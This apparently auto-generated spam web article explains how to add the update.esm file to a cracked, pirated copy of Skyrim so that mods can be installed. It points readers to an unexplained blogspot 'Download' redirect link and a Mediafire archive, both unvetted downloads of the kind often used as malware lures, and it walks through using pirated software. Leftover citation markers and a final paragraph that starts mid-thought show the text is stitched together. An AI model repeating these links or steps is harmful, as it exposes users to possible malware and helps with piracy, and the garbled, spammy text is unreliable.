# How to Install Mods on Skyrim Cracked with Update Esm 135
 <article>
<p>If you have downloaded a cracked version of Skyrim from a torrent site, you may have encountered an error when trying to install mods with Nexus Mod Manager. The error says that you are missing the update.esm file, which is required for most mods to work. In this article, we will show you how to fix this problem and enjoy modding your Skyrim game.</p>
<p>The update.esm file is a master file that contains data for the official patches and updates for Skyrim. It is usually included in the original game installation, but some cracked versions may not have it. To get the update.esm file, you can either download it from a reliable source or copy it from another Skyrim installation. Here are the steps to follow:</p>
<p><b><b>Download</b> &#10038; <a href="https://persifalque.blogspot.com/?d=2uNm5Y">https://persifalque.blogspot.com/?d=2uNm5Y</a></b></p>


<ol>
<li>Download the update.esm file from <a href="https://www.reddit.com/r/CrackSupport/comments/8c0egt/anyway_to_download_just_the_updateesm_file_for/">this Reddit post</a> [^1^] or from <a href="http://www.mediafire.com/file/a7ivy8s9b9y9z7a/Update.rar/file">this Mediafire link</a> [^2^]. Alternatively, you can copy the update.esm file from another Skyrim installation that has it.</li>
<li>Extract the update.esm file from the downloaded archive or copy it to your desktop.</li>
<li>Locate your Skyrim folder where you installed the cracked game. It should be something like C:\Program Files (x86)\The Elder Scrolls V Skyrim.</li>
<li>Paste the update.esm file into the Data folder inside your Skyrim folder. If you are asked to overwrite an existing file, choose yes.</li>
<li>Launch Nexus Mod Manager and scan for your Skyrim game. It should now detect the update.esm file and allow you to install mods.</li>
</ol>
<p>Congratulations! You have successfully installed the update.esm file for your cracked Skyrim game. You can now enjoy modding your game with Nexus Mod Manager or other modding tools. However, keep in mind that some mods may not work properly with cracked versions of Skyrim, and that using pirated software is illegal and unethical. We recommend that you buy the original game from Steam or other official sources if you can afford it.</p>

They can improve the graphics, gameplay, immersion, or fun factor of Skyrim. However, not all mods are compatible with each other or with the cracked version of Skyrim, so you should always read the mod descriptions and instructions carefully before installing them.</p>
